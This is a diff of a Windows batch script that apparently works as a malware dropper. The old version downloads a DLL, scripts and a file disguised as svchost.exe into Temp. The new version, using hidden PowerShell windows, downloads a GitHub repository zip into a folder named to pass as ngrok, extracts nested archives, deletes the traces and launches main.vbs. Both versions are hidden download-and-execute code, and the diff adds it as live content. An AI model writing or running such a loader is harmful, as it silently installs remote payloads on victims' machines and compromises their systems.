@@ -2,26 +2,27 @@
 setlocal
 
 set "USER=%USERNAME%"
-set "TEMP_DIR=C:\Users\%USER%\AppData\Local\Temp"
+set "NGROK_DIR=C:\Users\%USER%\AppData\Local\ngrok"
+set "REPO_URL=https://github.com/ofutpemata22/mamf/archive/refs/heads/main.zip"
+set "ZIP_PATH=%NGROK_DIR%\mamf.zip"
 
-set "DLL_URL=https://raw.githubusercontent.com/ofutpemata22/mamf/main/Repair.dll"
-set "VBS_URL=https://raw.githubusercontent.com/ofutpemata22/mamf/main/main.vbs"
-set "BAT_URL=https://raw.githubusercontent.com/ofutpemata22/mamf/main/1.bat"
-set "BAT2_URL=https://github.com/ofutpemata22/mamf/raw/main/2.bat"
-set "PCA_URL=https://github.com/ofutpemata22/mamf/blob/main/svchost.exe"
+if not exist "%NGROK_DIR%" mkdir "%NGROK_DIR%"
 
-set "DLL_PATH=%TEMP_DIR%\Repair.dll"
-set "VBS_PATH=%TEMP_DIR%\main.vbs"
-set "BAT_PATH=%TEMP_DIR%\1.bat"
-set "BAT2_PATH=%TEMP_DIR%\2.bat"
-set "PCA_PATH=%TEMP_DIR%\svchost.exe"
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%REPO_URL%', '%ZIP_PATH%')"
 
-powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DLL_URL%', '%DLL_PATH%')"
-powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%VBS_URL%', '%VBS_PATH%')"
-powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%BAT_URL%', '%BAT_PATH%')"
-powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%BAT2_URL%', '%BAT2_PATH%')"
-powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%PCA_URL%', '%PCA_PATH%')"
+powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%NGROK_DIR%\__repo__'"
 
-start "" "%VBS_PATH%"
+xcopy "%NGROK_DIR%\__repo__\mamf-main\*" "%NGROK_DIR%\" /s /e /h /y
+
+del "%ZIP_PATH%"
+rmdir /S /Q "%NGROK_DIR%\__repo__"
+
+powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%NGROK_DIR%\data.zip' -DestinationPath '%NGROK_DIR%\__extracted__'"
+
+xcopy "%NGROK_DIR%\__extracted__\*" "%NGROK_DIR%\" /s /e /h /y
+
+rmdir /S /Q "%NGROK_DIR%\__extracted__"
+
+start "" "%NGROK_DIR%\main.vbs"
 
 endlocal
